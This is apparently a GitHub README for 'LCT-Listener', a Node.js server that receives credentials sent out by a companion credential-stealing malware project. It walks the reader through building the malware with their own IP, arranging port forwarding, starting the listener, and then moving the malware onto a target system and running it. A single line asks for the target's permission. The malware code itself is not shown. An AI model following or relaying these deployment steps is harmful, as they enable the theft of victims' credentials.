# LCT-Listener
LCT Malware Listener, is a package that can make your system to listen to a port like a web server. So you can receive Credentials that are sending by LCT-Malware

Requirements:
+ NodeJS
+ NPM

# Usage
First Build your Malware from the [Other repository](https://github.com/iHapiW/LCT-Malware) Using Your IP.<br/>
*Note that if the Target is not in the Local Network, You should Handle the "Port Forwarding" Operations.*

Then Install Required Packages by `npm install`, so you can start listener by `node app.js` command.<br/>
And You can go ahead and beautify Received JSON with whatever tool that you want, but the simple way that i use is :
```
python3 -m json.tool JSONFILE
```
You should put your Json File name except `JSONFILE`

Now you are free to move the Malware to Target System and Execute it :)<br/>
But Hold on! Make sure that you have permission from the Person that You're Targeting.

# Contributors
- iHapiW
